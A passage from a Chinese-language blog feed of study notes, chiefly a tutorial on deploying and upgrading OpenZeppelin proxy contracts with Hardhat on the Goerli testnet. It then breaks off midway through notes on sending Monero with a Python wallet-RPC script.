<p><a href="https://medium.com/compound-finance/delegation-and-voting-with-eip-712-signatures-a636c9dfec5e">使用 EIP-712 签名进行委托和投票</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/metamask/eip712-is-coming-what-to-expect-and-how-to-use-it-bb92fd1a7a26">EIP712 is here: What to expect and how to use it</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/compound-developers/compound-governance-examples/blob/master/signature-examples/batch-publish-examples/README.md">https://github.com/compound-developers/compound-governance-examples/blob/master/signature-examples/batch-publish-examples/README.md</a></p>
</li>
<li class="lvl-2">
<p><a href="https://etherscan.io/address/0xc00e94Cb662C3520282E6f5717214004A7f26888#code">https://etherscan.io/address/0xc00e94Cb662C3520282E6f5717214004A7f26888#code</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2ERC20.sol">https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2ERC20.sol</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-使用OpenZeppelin编写可升级的智能合约</title>
    <url>/2022/16021.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>测试代码:<a href="https://github.com/jerrychan807/my-awesome-solidity/tree/main/learn_upgrade">https://github.com/jerrychan807/my-awesome-solidity/tree/main/learn_upgrade</a></p>
<h1>可升级的智能合约如何运作?</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221219181349.png" alt="20221219181349" /><br />
此图解释了可升级智能合约的工作原理。具体来说，这是透明代理模式。另一种是 UUPS 代理模式（通用可升级代理标准）。</p>
<p>可升级智能合约由3个合约组成：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>代理合约</code>：用户与之交互的智能合约。它将保留数据/状态，这意味着数据存储在该代理合约帐户的上下文中。这是一个EIP1967标准代理合约。</p>
</li>
<li class="lvl-2">
<p><code>执行合约</code>：智能合约提供功能和执行逻辑。请注意，数据也在本合同中定义。这是你需要去构建的智能合约。</p>
</li>
<li class="lvl-2">
<p><code>ProxyAdmin合约</code>: 关联代理合约和执行合约。</p>
</li>
</ul>
<h1>如何部署代理?如何升级代理?</h1>
<p>当我们第一次使用 Hardhat的 OpenZeppelin Upgrades 插件部署可升级合约时，我们部署了三个合约：</p>
<ol>
<li class="lvl-3">
<p>部署 “Implementation contract”</p>
</li>
<li class="lvl-3">
<p>部署 “ProxyAdmin contract”</p>
</li>
<li class="lvl-3">
<p>部署 “Proxy contract”</p>
</li>
</ol>
<p><code>当用户调用代理合约时，调用被委托给实现合约（delegate call）。</code></p>
<p>升级合约时，我们做的是：</p>
<ol>
<li class="lvl-3">
<p>部署一个新的执行合约</p>
</li>
<li class="lvl-3">
<p>升级ProxyAdmin合约,对代理的所有调用重定向到新的执行合同</p>
</li>
</ol>
<h1>使用插件:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加插件</span></span><br><span class="line">yarn add @openzeppelin/hardhat-upgrades</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编辑hardhat.config.ts以使用升级插件</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/hardhat-upgrades&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>将使用插件里的三个函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">deployProxy</span>()</span><br><span class="line"><span class="title function_">upgradeProxy</span>()</span><br><span class="line"><span class="title function_">prepareUpgrade</span>()</span><br></pre></td></tr></table></figure>
<h1>初始合约V1:</h1>
<h2 id="合约">合约:</h2>
<p>普通合约和可升级合约的最大区别在于可升级合同没有<code>constructor()</code>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contracts/Box.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Box</span> &#123;</span><br><span class="line">    uint256 private value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Emitted when the stored value changes</span></span><br><span class="line">    event <span class="title class_">ValueChanged</span>(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stores a new value in the contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">store</span>(<span class="params">uint256 newValue</span>) public &#123;</span><br><span class="line">        value = newValue;</span><br><span class="line">        emit <span class="title class_">ValueChanged</span>(newValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reads the last stored value</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">retrieve</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>省略测试脚本</p>
</blockquote>
<h2 id="部署脚本-2">部署脚本:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// scripts/1.deploy_box.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; upgrades &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Box</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Box&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Deploying Box...&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> box = <span class="keyword">await</span> upgrades.<span class="title function_">deployProxy</span>(<span class="title class_">Box</span>,[<span class="number">42</span>], &#123; <span class="attr">initializer</span>: <span class="string">&#x27;store&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">address</span>,<span class="string">&quot; box(proxy) address&quot;</span>)</span><br><span class="line">  <span class="comment">// console.log(await upgrades.erc1967.getImplementationAddress(box.address),&quot; getImplementationAddress&quot;)</span></span><br><span class="line">  <span class="comment">// console.log(await upgrades.erc1967.getAdminAddress(box.address),&quot; getAdminAddress&quot;)    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error)</span><br><span class="line">  process.<span class="property">exitCode</span> = <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>要部署可升级的合约，我们使用<code>upgrades.deployProxy()</code></p>
</li>
<li class="lvl-3">
<p>调用<code>initializer</code>来指定函数，并对初始值赋值</p>
</li>
</ol>
<h2 id="部署到goerli测试网">部署到goerli测试网:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部署</span></span><br><span class="line">yarn hardhat run deploy/1.deploy_box.ts --network goerli</span><br><span class="line"><span class="comment"># 验证源码</span></span><br><span class="line">yarn hardhat verify --contract contracts/Box.sol:Box --network goerli 0x480Da334985e4443977AD71ebC0E35A4B24BDeb4</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"> yarn hardhat run deploy/1.deploy_box.ts --network goerli</span><br><span class="line">yarn run v1.22.18</span><br><span class="line">$ /jcoin/github/my-awesome-solidity/learn_upgrade/node_modules/.bin/hardhat run deploy/1.deploy_box.ts --network goerli</span><br><span class="line">Deploying Box...</span><br><span class="line">0x3Dfbe4b70669A9b2A044AE1d6cCe3B39270B8242  box(proxy) address</span><br><span class="line">Error: Contract at 0x3Dfbe4b70669A9b2A044AE1d6cCe3B39270B8242 doesn<span class="string">&#x27;t look like an ERC 1967 proxy with a logic contract address</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Done in 10.55s.</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这一步有点奇怪,一直会报这个错,但试了一次，是能成功部署3个合约上去。后续有空debug一下。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221219185251.png" alt="20221219185251" /></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Box合约: 0x480Da334985e4443977AD71ebC0E35A4B24BDeb4</span><br><span class="line">ProxyAdmin合约: 0x6128464E9C4020CE2B07867e927e09fb39ca85D2</span><br><span class="line">TransparentUpgradeableProxy合约: 0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad</span><br></pre></td></tr></table></figure>
<h2 id="Debug结果">Debug结果:</h2>
<p>部署脚本里可以把以下两行注释掉,就不会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// console.log(await upgrades.erc1967.getImplementationAddress(box.address),&quot; getImplementationAddress&quot;)</span></span><br><span class="line"><span class="comment">// console.log(await upgrades.erc1967.getAdminAddress(box.address),&quot; getAdminAddress&quot;)    </span></span><br></pre></td></tr></table></figure>
<p>部署只需要这一行代码即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> box = <span class="keyword">await</span> upgrades.<span class="title function_">deployProxy</span>(<span class="title class_">Box</span>, [<span class="number">42</span>], &#123;<span class="attr">initializer</span>: <span class="string">&#x27;store&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>把<code>artifacts</code>,<code>cache</code>,<code>.openzeppelin</code>缓存文件删除后,插件才会重新部署三个新合约，否则只会部署一个新的<code>TransparentUpgradeableProxy合约</code>，而复用之前的<code>Box合约</code>和<code>ProxyAdmin合约</code>。</p>
<h2 id="Hardhat控制台测试合约">Hardhat控制台测试合约:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn hardhat console --network goerli</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line">box = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;Box&quot;</span>, address)</span><br><span class="line"><span class="keyword">await</span> box.<span class="title function_">retrieve</span>()</span><br><span class="line"><span class="comment">//BigNumber &#123; value: &quot;42&quot; &#125;</span></span><br></pre></td></tr></table></figure>
<h1>升级合约到V2:</h1>
<h2 id="合约-2">合约:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contracts/BoxV2.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Box.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">BoxV2</span> is <span class="title class_">Box</span>&#123;</span><br><span class="line">    <span class="comment">// Increments the stored value by 1</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="title function_">store</span>(<span class="title function_">retrieve</span>()+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>省略测试脚本</p>
</blockquote>
<h2 id="升级脚本">升级脚本:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// scripts/2.upgradeV2.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; upgrades &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxyAddress = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(proxyAddress,<span class="string">&quot; original Box(proxy) address&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">BoxV2</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;BoxV2&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;upgrade to BoxV2...&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> boxV2 = <span class="keyword">await</span> upgrades.<span class="title function_">upgradeProxy</span>(proxyAddress, <span class="title class_">BoxV2</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(boxV2.<span class="property">address</span>,<span class="string">&quot; BoxV2 address(should be the same)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> upgrades.<span class="property">erc1967</span>.<span class="title function_">getImplementationAddress</span>(boxV2.<span class="property">address</span>),<span class="string">&quot; getImplementationAddress&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> upgrades.<span class="property">erc1967</span>.<span class="title function_">getAdminAddress</span>(boxV2.<span class="property">address</span>), <span class="string">&quot; getAdminAddress&quot;</span>)    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error)</span><br><span class="line">  process.<span class="property">exitCode</span> = <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>通过该脚本,我们把Box合约升级到BoxV2</p>
<ol>
<li class="lvl-3">
<p>部署一个新的合约BoxV2</p>
</li>
<li class="lvl-3">
<p>并在 ProxyAdmin 中链接到一个新的执行合约</p>
</li>
</ol>
<h2 id="部署到goerli测试网-2">部署到goerli测试网:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部署</span></span><br><span class="line">yarn hardhat run deploy/2.upgradeV2.ts --network goerli</span><br><span class="line"><span class="comment"># 验证源码</span></span><br><span class="line">yarn hardhat verify --contract contracts/BoxV2.sol:BoxV2 --network goerli 0xD57dA84ef78a7674b3CC74F9a70D325B8132bCB1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221219190609.png" alt="20221219190609" /></p>
<h2 id="Hardhat控制台测试合约-2">Hardhat控制台测试合约:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn hardhat console --network goerli</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line">boxv2 = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;BoxV2&quot;</span>, address)</span><br><span class="line"><span class="keyword">await</span> boxv2.<span class="title function_">retrieve</span>()</span><br><span class="line"><span class="comment">//BigNumber &#123; value: &quot;42&quot; &#125;</span></span><br><span class="line"><span class="keyword">await</span> boxv2.<span class="title function_">increment</span>()</span><br><span class="line"><span class="keyword">await</span> boxv2.<span class="title function_">retrieve</span>()</span><br><span class="line"><span class="comment">//BigNumber &#123; value: &quot;43&quot; &#125;</span></span><br></pre></td></tr></table></figure>
<p>交互的合约地址没变,但更新新合约后,多了一个<code>increment()</code>函数</p>
<h1>升级合约到V3:</h1>
<h2 id="合约-3">合约:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contracts/BoxV3.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./BoxV2.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">BoxV3</span> is <span class="title class_">BoxV2</span>&#123;</span><br><span class="line">    string public name;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">NameChanged</span>(string name);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setName</span>(<span class="params">string memory _name</span>) public &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        emit <span class="title class_">NameChanged</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>略过测试</p>
</blockquote>
<h2 id="升级脚本-2">升级脚本:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// scripts/3.upgradeV3.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; upgrades &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxyAddress = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(proxyAddress,<span class="string">&quot; original Box(proxy) address&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">BoxV3</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;BoxV3&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;upgrade to BoxV3...&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> boxV3 = <span class="keyword">await</span> upgrades.<span class="title function_">upgradeProxy</span>(proxyAddress, <span class="title class_">BoxV3</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(boxV3.<span class="property">address</span>,<span class="string">&quot; BoxV3 address(should be the same)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> upgrades.<span class="property">erc1967</span>.<span class="title function_">getImplementationAddress</span>(boxV3.<span class="property">address</span>),<span class="string">&quot; getImplementationAddress&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> upgrades.<span class="property">erc1967</span>.<span class="title function_">getAdminAddress</span>(boxV3.<span class="property">address</span>), <span class="string">&quot; getAdminAddress&quot;</span>)    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error)</span><br><span class="line">  process.<span class="property">exitCode</span> = <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="部署到goerli测试网-3">部署到goerli测试网:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部署</span></span><br><span class="line">yarn hardhat run deploy/3.upgradeV3.ts --network goerli</span><br><span class="line"><span class="comment"># 验证源码</span></span><br><span class="line">yarn hardhat verify --contract contracts/BoxV3.sol:BoxV3 --network goerli 0xf638135eD0D5cD11a5C5c2D0c46ab7367e362BFd </span><br></pre></td></tr></table></figure>
<h2 id="Hardhat控制台测试合约-3">Hardhat控制台测试合约:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn hardhat console --network goerli</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line">boxv3 = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;BoxV3&quot;</span>, address)</span><br><span class="line"><span class="keyword">await</span> boxv3.<span class="title function_">retrieve</span>()</span><br><span class="line"><span class="comment">//BigNumber &#123; value: &quot;42&quot; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> boxv3.<span class="title function_">setName</span>(<span class="string">&quot;mybox&quot;</span>)</span><br><span class="line"><span class="comment">// tx response</span></span><br><span class="line"><span class="keyword">await</span> boxv3.<span class="title function_">name</span>()</span><br><span class="line"><span class="comment">//&#x27;mybox&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221219191534.png" alt="20221219191534" /></p>
<h1>升级合约到V4:</h1>
<h2 id="合约-4">合约:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contracts/BoxV4.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./BoxV2.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">BoxV4</span> is <span class="title class_">BoxV2</span>&#123;</span><br><span class="line">    string private name;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">NameChanged</span>(string name);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setName</span>(<span class="params">string memory _name</span>) public &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        emit <span class="title class_">NameChanged</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">string memory</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">string</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;Name: &quot;</span>,name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="升级脚本-3">升级脚本:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// scripts/4.prepareV4.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; upgrades &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxyAddress = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(proxyAddress,<span class="string">&quot; original Box(proxy) address&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">BoxV4</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;BoxV4&quot;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Preparing upgrade to BoxV4...&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> boxV4Address = <span class="keyword">await</span> upgrades.<span class="title function_">prepareUpgrade</span>(proxyAddress, <span class="title class_">BoxV4</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(boxV4Address, <span class="string">&quot; BoxV4 implementation contract address&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error)</span><br><span class="line">  process.<span class="property">exitCode</span> = <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>调用时<code>upgrades.upgradeProxy()</code>，完成两项工作：</p>
<ol>
<li class="lvl-3">
<p>部署了一个执行合约</p>
</li>
<li class="lvl-3">
<p>调用 ProxyAdmin合约的upgrade()来链接 Proxy 和执行合约。</p>
</li>
</ol>
<p>我们此处调用的<code>upgrades.prepareUpgrade()</code>时只完成第一项，第二项留给开发者手动完成。</p>
<h2 id="部署到goerli测试网-4">部署到goerli测试网:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部署</span></span><br><span class="line">yarn hardhat run deploy/4.prepareV4.ts --network goerli</span><br><span class="line"><span class="comment"># 验证源码</span></span><br><span class="line">yarn hardhat verify --contract contracts/BoxV4.sol:BoxV4 --network goerli 0xd37950f48eb44fba46b9c722d6c8dc4739c61232 </span><br></pre></td></tr></table></figure>
<p>手动在ProxyAdmin合约上执行upgrade动作。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221219192320.png" alt="20221219192320" /></p>
<h2 id="Hardhat控制台测试合约-4">Hardhat控制台测试合约:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn hardhat console --network goerli</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&#x27;0xfA86bf3B1aFC147276b4a21fDe03fc59F63c60ad&#x27;</span></span><br><span class="line">box = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;BoxV4&quot;</span>, address)</span><br><span class="line"><span class="keyword">await</span> box.<span class="title function_">getName</span>()</span><br><span class="line"><span class="comment">//&#x27;Name: mynewbox&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://dev.to/yakult/tutorial-write-upgradeable-smart-contract-proxy-contract-with-openzeppelin-1916">Web3 教程：使用 OpenZeppelin 编写可升级的智能合约（代理）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://forum.openzeppelin.com/t/openzeppelin-upgrades-step-by-step-tutorial-for-hardhat/3580">OpenZeppelin Upgrades: Step by Step Tutorial for Hardhat</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-使用Python转账monero</title>
    <url>/2023/33827.html</url>
    <content><![CDATA[<h1>下载门罗币软件:</h1>
<p><a href="https://www.getmonero.org/downloads/#cli">https://www.getmonero.org/downloads/#cli</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231212000102.png" alt="20231212000102" /></p>
<p>我这里选择macos Intel版本.<br />
使用python脚本进行转账的前提是需要运行起：</p>
<ol>
<li class="lvl-3">
<p>守护进程</p>
</li>
<li class="lvl-3">
<p>钱包Rpc</p>
</li>
</ol>
<h1>运行守护进程:</h1>
<p>此处可以选择本地节点或<a href="https://www.getmonero.org/zh-cn/resources/moneropedia/remote-node.html">远程节点</a>.<br />
如果在本地运行monerod守护进程的话，它会开始同步区块，数据量有点大。<br />
为了方便，少运行一个进程,直接在<a href="https://monero.fail/">列表</a>中选择一个远程公共节点。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231212000510.png" alt="20231212000510" /></p>
<h1>运行钱包Rpc:</h1>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到monero软件文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /xxx/monero-x86_64-apple-darwin11-v0.18.3.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行起钱包rpc,连接远程公共的守护进程节点</span></span><br><span class="line">./monero-wallet-rpc --wallet-file <span class="string">&quot;../testone.keys&quot;</span> --password <span class="string">&quot;YourPwd&quot;</span> --daemon-address moneronode.org:18081 --rpc-bind-port 18089 --disable-rpc-login</span><br></pre></td></tr></table></figure>
<h1>Python转账:</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> monero.wallet <span class="keyword">import</span> Wallet</span><br><span class="line"><span class="keyword">from</span> monero.backends.jsonrpc <span class="keyword">import</span> JSONRPCWallet</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">wallet = Wallet(JSONRPCWallet(port=<span class="number">18089</span>)) <span class="comment"># 连接wallet Rpc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(wallet.address())</span><br><span class="line"><span class="built_in">print</span>(wallet.balance())</span><br><span class="line"></span><br><span class="line">txs = wallet.transfer(</span><br><span class="line">    <span class="string">&#x27;46EsfH8H9TriLXb54U1Q916cWunwGDsgRZHgRXCVP5vzfiwKYvvuo78hyWAc12vXWZ3LVT9o7qEj4iYBvv8yPhEN4N91Hn8&#x27;</span>,  <span class="comment"># my addr</span></span><br><span class="line">    Decimal(<span class="string">&#x27;0.01&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span 